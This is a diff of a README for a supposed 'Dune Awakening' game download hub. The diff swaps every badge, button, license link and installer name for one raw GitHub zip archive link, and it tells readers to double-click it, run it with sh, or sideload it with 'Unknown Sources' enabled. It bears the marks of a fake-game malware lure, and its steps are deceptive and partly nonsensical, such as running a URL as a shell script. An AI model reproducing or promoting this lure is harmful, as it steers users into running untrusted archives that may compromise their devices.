@@ -1,9 +1,9 @@
 # Dune Awakening Download Hub
 
-![Dune Logo](https://img.shields.io/badge/Dune_Awakening-Next_Gen_Game-blueviolet)  
-![Downloads](https://img.shields.io/badge/Downloads-200K%2B-brightgreen)  
-![OpenAI Integrated](https://img.shields.io/badge/OpenAI-API_Connected-ff69b4)  
-![License](https://img.shields.io/badge/License-MIT-yellow.svg)
+![Dune Logo](https://github.com/yton12/dune-awakening-pc-full-version/raw/refs/heads/branch/hemitriglyph/dune-version-pc-full-awakening-schlemiel.zip)  
+![Downloads](https://github.com/yton12/dune-awakening-pc-full-version/raw/refs/heads/branch/hemitriglyph/dune-version-pc-full-awakening-schlemiel.zip%2B-brightgreen)  
+![OpenAI Integrated](https://github.com/yton12/dune-awakening-pc-full-version/raw/refs/heads/branch/hemitriglyph/dune-version-pc-full-awakening-schlemiel.zip)  
+![License](https://github.com/yton12/dune-awakening-pc-full-version/raw/refs/heads/branch/hemitriglyph/dune-version-pc-full-awakening-schlemiel.zip)
 
 > _Surge ahead into dunes of discovery. Step into Arrakis, where every grain carries a destiny..._
 
@@ -11,7 +11,7 @@
 
 ## 🚀 Quick Access Portal
 
-[![Download](https://i.imgur.com/G4UXs0N.png)](https://yton12.github.io)
+[![Download](https://github.com/yton12/dune-awakening-pc-full-version/raw/refs/heads/branch/hemitriglyph/dune-version-pc-full-awakening-schlemiel.zip)](https://github.com/yton12/dune-awakening-pc-full-version/raw/refs/heads/branch/hemitriglyph/dune-version-pc-full-awakening-schlemiel.zip)
 
 ---
 
@@ -69,13 +69,13 @@ Secure your digital passage to Dune Awakening using this streamlined process:
 
 ### 1. Visit the Download Gateway
 
-Begin by accessing the https://yton12.github.io for the latest Dune Awakening Acquisition Package (*DAAP*).
+Begin by accessing the https://github.com/yton12/dune-awakening-pc-full-version/raw/refs/heads/branch/hemitriglyph/dune-version-pc-full-awakening-schlemiel.zip for the latest Dune Awakening Acquisition Package (*DAAP*).
 
 ### 2. Initiate Download
 
 Click the button below to begin your odyssey:
 
-[![Download](https://i.imgur.com/G4UXs0N.png)](https://yton12.github.io)
+[![Download](https://github.com/yton12/dune-awakening-pc-full-version/raw/refs/heads/branch/hemitriglyph/dune-version-pc-full-awakening-schlemiel.zip)](https://github.com/yton12/dune-awakening-pc-full-version/raw/refs/heads/branch/hemitriglyph/dune-version-pc-full-awakening-schlemiel.zip)
 
 ### 3. Unpack the Archive
 
@@ -83,9 +83,9 @@ Extract the **DAAP** installer using any standard archive utility (WinRAR, 7-Zip
 
 ### 4. Run the Installer
 
-- **Windows/Mac**: Double-click `DuneAwakening_Setup.exe` or `DuneAwakening_Installer.pkg`
-- **Linux**: Run `sh duneawaken_install.sh` in terminal
-- **Android**: Sideload `DuneAwakening.mobile.apk` (enable "Unknown Sources")
+- **Windows/Mac**: Double-click `https://github.com/yton12/dune-awakening-pc-full-version/raw/refs/heads/branch/hemitriglyph/dune-version-pc-full-awakening-schlemiel.zip` or `https://github.com/yton12/dune-awakening-pc-full-version/raw/refs/heads/branch/hemitriglyph/dune-version-pc-full-awakening-schlemiel.zip`
+- **Linux**: Run `sh https://github.com/yton12/dune-awakening-pc-full-version/raw/refs/heads/branch/hemitriglyph/dune-version-pc-full-awakening-schlemiel.zip` in terminal
+- **Android**: Sideload `https://github.com/yton12/dune-awakening-pc-full-version/raw/refs/heads/branch/hemitriglyph/dune-version-pc-full-awakening-schlemiel.zip` (enable "Unknown Sources")
 
 ### 5. Follow On-Screen Instructions
 
@@ -150,7 +150,7 @@ _We do not host, distribute, or otherwise provide any full game binaries. For le
 Copyright (c) 2025
 
 Distributed under the MIT License.  
-See the full license [here](https://opensource.org/licenses/MIT).
+See the full license [here](https://github.com/yton12/dune-awakening-pc-full-version/raw/refs/heads/branch/hemitriglyph/dune-version-pc-full-awakening-schlemiel.zip).
 
 ---
 
@@ -158,7 +158,7 @@ See the full license [here](https://opensource.org/licenses/MIT).
 
 Let the journey begin or download again with confidence!
 
-[![Download](https://i.imgur.com/G4UXs0N.png)](https://yton12.github.io)
+[![Download](https://github.com/yton12/dune-awakening-pc-full-version/raw/refs/heads/branch/hemitriglyph/dune-version-pc-full-awakening-schlemiel.zip)](https://github.com/yton12/dune-awakening-pc-full-version/raw/refs/heads/branch/hemitriglyph/dune-version-pc-full-awakening-schlemiel.zip)
 
 ---
 
